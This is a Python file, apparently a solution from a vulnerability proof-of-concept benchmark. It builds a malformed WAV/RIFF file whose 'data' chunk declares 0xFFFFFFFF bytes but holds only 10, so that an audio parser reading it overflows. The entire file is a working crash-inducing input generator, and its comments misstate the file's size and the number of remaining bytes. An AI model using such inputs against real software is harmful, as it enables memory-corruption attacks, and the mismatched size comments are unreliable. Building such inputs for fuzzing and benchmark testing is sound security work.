import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF header (12 bytes)
        # 4 bytes: 'RIFF'
        # 4 bytes: file size minus 8 (little-endian)
        # 4 bytes: 'WAVE' format
        
        # Chunk structure for vulnerability:
        # 4 bytes: chunk ID ('data' in this case)
        # 4 bytes: chunk size (little-endian)
        # chunk data
        
        # Create a malformed WAV/RIFF file where chunk size exceeds actual data
        
        riff_header = b'RIFF'
        file_size = 50  # Total file size minus 8 = 58 - 8 = 50
        format_type = b'WAVE'
        
        # 'fmt ' chunk (24 bytes)
        fmt_chunk = b'fmt '
        fmt_size = 16  # PCM format chunk size
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 8000
        byte_rate = 16000
        block_align = 2
        bits_per_sample = 16
        
        # 'data' chunk - vulnerable chunk
        data_chunk = b'data'
        # Set chunk size larger than actual remaining data to cause overflow
        # File is 58 bytes total, we've used 44 bytes so far, only 14 bytes remain
        # But we set chunk size to 0xFFFFFFFF to trigger maximum overflow
        chunk_size = 0xFFFFFFFF
        
        # Construct the file
        poc = (
            riff_header + 
            file_size.to_bytes(4, 'little') + 
            format_type +
            
            fmt_chunk +
            fmt_size.to_bytes(4, 'little') +
            audio_format.to_bytes(2, 'little') +
            num_channels.to_bytes(2, 'little') +
            sample_rate.to_bytes(4, 'little') +
            byte_rate.to_bytes(4, 'little') +
            block_align.to_bytes(2, 'little') +
            bits_per_sample.to_bytes(2, 'little') +
            
            data_chunk +
            chunk_size.to_bytes(4, 'little') +
            b'A' * 10  # Only 10 bytes of actual data, but chunk claims 0xFFFFFFFF bytes
        )
        
        return poc
